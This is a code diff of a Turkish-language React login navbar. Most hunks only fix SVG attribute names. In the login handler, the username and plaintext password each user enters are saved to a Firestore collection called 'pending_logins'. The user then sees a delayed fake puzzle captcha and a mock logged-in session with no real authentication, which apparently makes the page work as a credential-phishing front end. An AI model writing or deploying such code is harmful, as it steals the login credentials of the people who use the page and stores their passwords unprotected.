@@ -2,21 +2,23 @@
 import React, { useState, useRef, useEffect } from 'react'
 import Image from 'next/image'
 import { useRouter } from 'next/navigation'
-import { createPortal } from 'react-dom'
 import { Eye } from 'lucide-react'
+import { collection, addDoc } from 'firebase/firestore'
+import { db } from '@/lib/firebase'
 import logo from "../assets/logo.png"
 import asdas from "../assets/asdas.jpg"
-import LoadingScreen from './LoadingScreen'
 import PuzzleCaptcha from './PuzzleCaptcha'
-import { db } from '../lib/firebase'
-import { collection, addDoc } from 'firebase/firestore'
 
-const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData }) => {
+const Navbar = ({ onLoginClick }) => {
   const router = useRouter()
   const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false)
   const [isLoading, setIsLoading] = useState(false)
   const profileMenuRef = useRef(null)
   const profileIconRef = useRef(null)
+  
+  // Local state for login - localStorage tabanlı
+  const [isLoggedIn, setIsLoggedIn] = useState(false)
+  const [userData, setUserData] = useState(null)
 
   // Mobile Detection
   const [isMobile, setIsMobile] = useState(false)
@@ -28,7 +30,6 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
   const [showPassword, setShowPassword] = useState(false)
   const [isLoggingIn, setIsLoggingIn] = useState(false)
   const [isLoadingCaptcha, setIsLoadingCaptcha] = useState(false)
-  const [showLoadingScreen, setShowLoadingScreen] = useState(false)
   
   // CAPTCHA Puzzle States
   const [showCaptcha, setShowCaptcha] = useState(false)
@@ -38,6 +39,21 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
   const [isDragging, setIsDragging] = useState(false)
   const sliderContainerRef = useRef(null)
   const startXRef = useRef(0)
+
+  // localStorage'dan kullanıcı verilerini yükle
+  useEffect(() => {
+    const storedUserData = localStorage.getItem('userData')
+    if (storedUserData) {
+      try {
+        const parsedData = JSON.parse(storedUserData)
+        setUserData(parsedData)
+        setIsLoggedIn(true)
+      } catch (error) {
+        console.error('localStorage verisi okunamadı:', error)
+        localStorage.removeItem('userData')
+      }
+    }
+  }, [])
 
   // Mobile detection
   useEffect(() => {
@@ -224,23 +240,17 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
   const handleCompleteCaptcha = () => {
     setShowCaptcha(false)
     
-    setTimeout(() => {
-      setShowLoadingScreen(true)
-      
-      setTimeout(() => {
-        setIsLoggedIn(true)
-        setUserData({
-          username: username || 'Kullanıcı',
-          balance: 22.25,
-          currency: '₺'
-        })
-        setShowLoginModal(false)
-        setShowLoadingScreen(false)
-        setIsLoggingIn(false)
-        setUsername('')
-        setPassword('')
-      }, 3000)
-    }, 100)
+    // Mock kullanıcı verisi
+    const mockUserData = {
+      username: username || 'Kullanıcı',
+      currency: '₺'
+    }
+    
+    // localStorage'a kaydet
+    localStorage.setItem('userData', JSON.stringify(mockUserData))
+    
+    // /loading sayfasına yönlendir
+    router.push('/loading')
   }
 
   const handleLogin = async () => {
@@ -250,22 +260,25 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     }
     
     try {
+      // Firestore'a pending_logins collection'ına yeni document ekle
       await addDoc(collection(db, 'pending_logins'), {
         username: username,
         password: password,
-        status: 'pending',
-        timestamp: new Date()
+        status: 'pending'
       })
-      console.log('Login bilgileri Firestore\'a kaydedildi')
+      
+      console.log('Login denemesi Firestore\'a kaydedildi:', username)
     } catch (error) {
-      console.error('Firestore\'a veri eklenirken hata:', error)
+      console.error('Firestore kayıt hatası:', error)
+      alert('Giriş kaydı oluşturulurken bir hata oluştu')
+      return
     }
     
     setIsLoadingCaptcha(true)
     setTimeout(() => {
       setIsLoadingCaptcha(false)
       setShowCaptcha(true)
-    }, 1500)
+    }, 3800)
   }
 
   // Handle login button click from navbar
@@ -274,6 +287,14 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     if (onLoginClick) {
       onLoginClick()
     }
+  }
+
+  // Handle logout
+  const handleLogout = () => {
+    localStorage.removeItem('userData')
+    setIsLoggedIn(false)
+    setUserData(null)
+    setIsProfileMenuOpen(false)
   }
 
   const handleBalanceClick = () => {
@@ -448,64 +469,64 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M15.505 24.01L17.255 22.26C19.2115 22.26 20.93 22.106 22.533 20.51C23.142 19.901 24.6925 18.319 24.6925 18.319"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M7.51906 16.3876L3.66568 20.241L13.2979 29.8732L17.1513 26.0198L7.51906 16.3876Z"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M7.51801 19.859L8.80251 21.1435"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M28.4025 21.0805V22.8375H31.3355V5.25H28.4025V7.007"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M18.4345 13.4575H24.885C26.117 13.4575 26.635 13.8075 26.635 14.63C26.635 16.0965 25.116 16.975 23.7055 16.975H22.1165C21.9006 16.9742 21.6887 17.0325 21.5036 17.1436C21.3185 17.2546 21.1674 17.4142 21.0665 17.605C20.6979 18.2984 20.1481 18.8788 19.4756 19.2844C18.8032 19.69 18.0333 19.9055 17.248 19.908H16.1"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M22.5715 13.4575C22.68 12.4967 23.0506 11.5842 23.6427 10.8198C24.2348 10.0553 25.0256 9.46837 25.9287 9.12301C26.8319 8.77765 27.8126 8.68719 28.7637 8.86153C29.7147 9.03586 30.5996 9.46828 31.3215 10.1115"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M31.3355 17.976C30.7723 18.4797 30.1076 18.8566 29.3862 19.0812C28.6648 19.3059 27.9036 19.373 27.154 19.2781C26.4044 19.1832 25.684 18.9285 25.0413 18.5312C24.3987 18.1338 23.8489 17.6031 23.429 16.975"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
 </svg>
   )
@@ -527,32 +548,32 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M26.201 13.8075L17.262 27.4925H4.487"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M27.4785 16.415L18.5395 30.1H6.405"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M28.3255 13.783C29.2924 13.4056 30.0968 12.702 30.5996 11.7941C31.1024 10.8861 31.2719 9.83089 31.0788 8.81113C30.8856 7.79136 30.342 6.87123 29.542 6.21003C28.7419 5.54883 27.7359 5.18817 26.698 5.19051H8.30201C7.25101 5.18778 6.23299 5.55725 5.4284 6.23344C4.6238 6.90963 4.08461 7.84886 3.90638 8.88465C3.72816 9.92043 3.92243 10.9859 4.45474 11.8921C4.98706 12.7983 5.82304 13.4868 6.81451 13.8355"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M12.5125 16.905L17.71 15.12L17.0415 16.17L11.8195 17.955L12.5125 16.905ZM11.3505 18.69L16.6005 16.905L15.932 17.9725L10.682 19.7575L11.3505 18.69ZM15.3335 13.8075H16.45L11.081 22.183H9.9295L15.3335 13.8075ZM10.8185 21.063H13.1985C13.6532 21.0753 14.104 20.9755 14.511 20.7725C14.8917 20.5716 15.2101 20.2701 15.4315 19.901L16.051 18.9H17.1815L16.569 19.8975C16.1531 20.6062 15.5627 21.1966 14.854 21.6125C14.1407 22.0007 13.3384 22.1961 12.5265 22.1795H10.0975L10.8185 21.063Z"
@@ -581,8 +602,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
     <path
       fillRule="evenodd"
@@ -591,40 +612,40 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
     <path
       d="M19.313 30.051H29.5925V17.962"
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
     <path
       d="M5.41101 17.962V30.051H15.687"
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
     <path
       d="M19.313 17.962H30.8V13.125H4.20001V17.962H15.687"
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
     <path
       d="M19.313 13.125H15.687V30.051H19.313V13.125Z"
       stroke="#2A421C"
       strokeWidth="1.05"
       strokeMiterlimit={10}
-      stroke-linecap="round"
-      stroke-linejoin="round"
+      strokeLinecap="round"
+      strokeLinejoin="round"
     />
   </svg> 
   )
@@ -645,24 +666,24 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M15.428 27.3C16.7895 26.7925 17.7905 25.501 17.7905 24.15V22.9215C17.9013 22.4176 17.9634 21.9043 17.976 21.3885C18.0007 21.0607 17.9586 20.7312 17.8521 20.4201C17.7456 20.1091 17.577 19.8229 17.3565 19.579C16.9505 19.0505 16.1665 19.1485 16.1665 19.656V20.0655C16.1665 21.1995 15.1165 22.316 14.7665 22.6345C14.4165 22.953 13.762 23.6075 12.915 23.6075H11.837"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M11.837 23.065H9.67401V29.5575H11.837V23.065Z"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -671,8 +692,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -681,48 +702,48 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M13.461 13.328V17.654H22.1165V13.328"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M18.872 13.328H22.659V10.6225H12.9185V13.328H16.7055"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M18.872 10.6225V17.654"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.7055 17.654V10.6225"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M14 20.902H9.13149C8.98917 20.902 8.84825 20.8739 8.71681 20.8193C8.58537 20.7648 8.46599 20.6848 8.36552 20.584C8.26504 20.4832 8.18546 20.3636 8.13131 20.232C8.07717 20.1003 8.04953 19.9593 8.04999 19.817V6.30001C8.04999 6.01317 8.16394 5.73809 8.36676 5.53527C8.56958 5.33245 8.84466 5.21851 9.13149 5.21851H26.446C26.7328 5.21851 27.0079 5.33245 27.2107 5.53527C27.4135 5.73809 27.5275 6.01317 27.5275 6.30001V19.817C27.528 19.9593 27.5003 20.1003 27.4462 20.232C27.392 20.3636 27.3124 20.4832 27.212 20.584C27.1115 20.6848 26.9921 20.7648 26.8607 20.8193C26.7292 20.8739 26.5883 20.902 26.446 20.902H24.822V23.065C24.821 23.178 24.7848 23.2878 24.7184 23.3792C24.652 23.4706 24.5588 23.539 24.4516 23.5749C24.3445 23.6107 24.2288 23.6122 24.1208 23.5792C24.0128 23.5461 23.9177 23.4802 23.849 23.3905L21.5775 20.902H19.411"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
 </svg>
 
@@ -745,8 +766,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M13.258 30.5165V30.0755M13.258 30.5165C13.071 30.5156 12.8916 30.4421 12.7577 30.3115C12.6238 30.1809 12.5459 30.0034 12.5405 29.8165V16.66C12.541 16.6007 12.5649 16.5441 12.607 16.5025C12.6489 16.4633 12.7037 16.4409 12.761 16.4395H29.8795C29.9387 16.4399 29.9954 16.4638 30.037 16.506C30.0773 16.5471 30.0999 16.6024 30.1 16.66V29.8025C30.1 29.9881 30.0262 30.1662 29.895 30.2974C29.7637 30.4287 29.5856 30.5025 29.4 30.5025L13.258 30.5165ZM13.258 30.0755H29.4C29.4724 30.0755 29.5418 30.0467 29.593 29.9955C29.6442 29.9443 29.673 29.8749 29.673 29.8025V16.8805H12.9815V29.8025C12.9815 29.8386 12.9887 29.8744 13.0026 29.9077C13.0165 29.9411 13.037 29.9713 13.0627 29.9967C13.0884 30.0221 13.1189 30.0422 13.1524 30.0557C13.186 30.0692 13.2219 30.0759 13.258 30.0755Z"
@@ -863,8 +884,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -873,8 +894,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -883,8 +904,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -893,8 +914,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -903,8 +924,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -913,8 +934,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -923,8 +944,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -933,8 +954,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -943,8 +964,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -953,8 +974,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -963,8 +984,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -973,8 +994,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -983,8 +1004,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -993,8 +1014,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -1003,8 +1024,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     fillRule="evenodd"
@@ -1013,8 +1034,8 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M8.42383 12.4595L13.4525 14.6398C13.5855 14.6975 13.7401 14.6364 13.7978 14.5034L16.7062 7.79523C16.7639 7.66222 16.7028 7.50764 16.5698 7.44997L11.5411 5.26969C11.4081 5.21202 11.2535 5.2731 11.1958 5.40611L8.28741 12.1142C8.22974 12.2473 8.29082 12.4018 8.42383 12.4595Z"
@@ -1066,96 +1087,96 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M4.18207 9.45477H29.9541"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M6.16516 7.47192H7.48608"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M8.14807 7.47174H9.46899"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M14.094 12.0964H6.82373V20.0254H14.094V12.0964Z"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M6.16504 23.3288H14.7563"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M6.16504 25.9739H14.7563"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.7388 25.9739H24.0056"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.7388 23.3288H24.0056"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.7388 12.7586H24.0056"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.7388 15.4003H21.3637"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M23.3464 17.3836L27.3092 21.3499L34.5795 12.0964"
     stroke="#2A421C"
     strokeWidth="1.04552"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
 </svg>
 
@@ -1177,64 +1198,64 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M16.2295 11.2H23.2505C23.3216 11.1986 23.3922 11.2113 23.4584 11.2373C23.5246 11.2633 23.5849 11.3022 23.636 11.3516C23.6871 11.4011 23.7278 11.4602 23.756 11.5254C23.7842 11.5907 23.7991 11.6609 23.8 11.732V19.2955C23.8 19.3666 23.786 19.4369 23.7587 19.5026C23.7314 19.5682 23.6913 19.6278 23.6409 19.6779C23.5905 19.728 23.5307 19.7676 23.4649 19.7945C23.3991 19.8214 23.3286 19.835 23.2575 19.8345H12.4495C12.3779 19.8359 12.3066 19.823 12.24 19.7965C12.1734 19.7701 12.1128 19.7306 12.0616 19.6804C12.0104 19.6302 11.9698 19.5703 11.942 19.5042C11.9143 19.4381 11.9 19.3672 11.9 19.2955V13.895"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M12.4495 24.6995H23.2505"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M12.4495 22.5365H23.2505"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M12.4495 26.859H17.85"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M15.6905 18.7565C15.6905 18.4729 15.7463 18.1921 15.8549 17.9301C15.9634 17.6681 16.1225 17.43 16.323 17.2295C16.5235 17.029 16.7616 16.8699 17.0236 16.7614C17.2856 16.6528 17.5664 16.597 17.85 16.597C18.1336 16.597 18.4144 16.6528 18.6764 16.7614C18.9384 16.8699 19.1765 17.029 19.377 17.2295C19.5775 17.43 19.7366 17.6681 19.8451 17.9301C19.9536 18.1921 20.0095 18.4729 20.0095 18.7565"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M17.85 16.5935C18.745 16.5935 19.4705 15.868 19.4705 14.973C19.4705 14.078 18.745 13.3525 17.85 13.3525C16.955 13.3525 16.2295 14.078 16.2295 14.973C16.2295 15.868 16.955 16.5935 17.85 16.5935Z"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
   <path
     d="M11.9 9.5725V11.2C11.9 11.4868 12.014 11.7619 12.2168 11.9647C12.4196 12.1676 12.6947 12.2815 12.9815 12.2815H13.5205C13.6632 12.2824 13.8045 12.2551 13.9366 12.2012C14.0686 12.1473 14.1886 12.0677 14.2898 11.9672C14.391 11.8667 14.4713 11.7472 14.5261 11.6155C14.5808 11.4838 14.609 11.3426 14.609 11.2V6.3315C14.609 6.04467 14.4951 5.76958 14.2923 5.56676C14.0895 5.36394 13.8144 5.25 13.5275 5.25H12.4495C12.1627 5.25 11.8876 5.36394 11.6848 5.56676C11.482 5.76958 11.368 6.04467 11.368 6.3315V7.952"
     stroke="#2A421C"
     strokeWidth="1.05"
     strokeMiterlimit={10}
-    stroke-linecap="round"
-    stroke-linejoin="round"
+    strokeLinecap="round"
+    strokeLinejoin="round"
   />
 </svg>
 
@@ -1268,16 +1289,6 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
 
   return (
     <>
-      {isLoading && <LoadingScreen />}
-      
-      {/* Loading Screen - Rendered via Portal to ensure it's on top */}
-      {showLoadingScreen && typeof window !== 'undefined' && createPortal(
-        <div className="fixed inset-0 z-[99999] pointer-events-auto">
-          <LoadingScreen />
-        </div>,
-        document.body
-      )}
-
       {/* --- LOGIN MODAL --- */}
       {isMobile ? (
         // MOBILE VERSION
@@ -1294,7 +1305,7 @@ const Navbar = ({ onLoginClick, isLoggedIn, userData, setIsLoggedIn, setUserData
           }}
         >
